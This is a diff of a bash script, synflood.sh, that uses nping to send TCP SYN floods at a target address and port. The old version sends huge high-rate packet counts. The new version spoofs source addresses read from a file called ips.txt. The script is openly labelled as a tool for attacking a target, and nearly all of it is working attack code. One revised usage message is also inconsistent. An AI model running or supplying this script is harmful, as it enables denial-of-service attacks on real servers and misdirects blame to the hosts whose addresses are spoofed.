@@ -25,23 +25,16 @@ if [ -z "$(which nping)" ]; then
   esac
 else
   if [ -z $1 ]; then
-    echo "Usage: ./synflood.sh TARGET PORT MULTIPLIER, where \
-    TARGET is the IP address to attack, \
-    PORT is the port to attack on the target, \
-    and MULTIPLIER is the number of simultaneous process to run."
+    echo "Usage: ./synflood.sh TARGET PORT, where \
+    TARGET is the IP address to attack, and \
+    PORT is the port to attack on the target."
   elif [ -z $2 ]; then
-    echo "Usage: ./synflood.sh TARGET PORT MULTIPLIER, where \
-    TARGET is the IP address to attack, \
-    PORT is the port to attack on the target, \
-    and MULTIPLIER is the number of simultaneous process to run."
-  elif [ -z $3 ]; then
-    echo "Usage: ./synflood.sh TARGET PORT MULTIPLIER, where \
-    TARGET is the IP address to attack, \
-    PORT is the port to attack on the target, \
-    and MULTIPLIER is the number of simultaneous process to run."
+    echo "Usage: ./synflood.sh TARGET MULTIPLIER, where \
+    TARGET is the IP address to attack, and \
+    PORT is the port to attack on the target"
   else
-    while [ $i -lt $3 ]; do
-      nping -c 1000000000 --rate 90000 --tcp --flags SYN -S $1 -g $2 $(tr '\n' ' '<ips.txt) &
+    for i in $(tr '\n' ' '<ips.txt); do
+      nping -c 1 --rate 90000 --tcp --flags SYN -S $i -g $2 $1 &
       i=$[$i+1]
     done
   fi
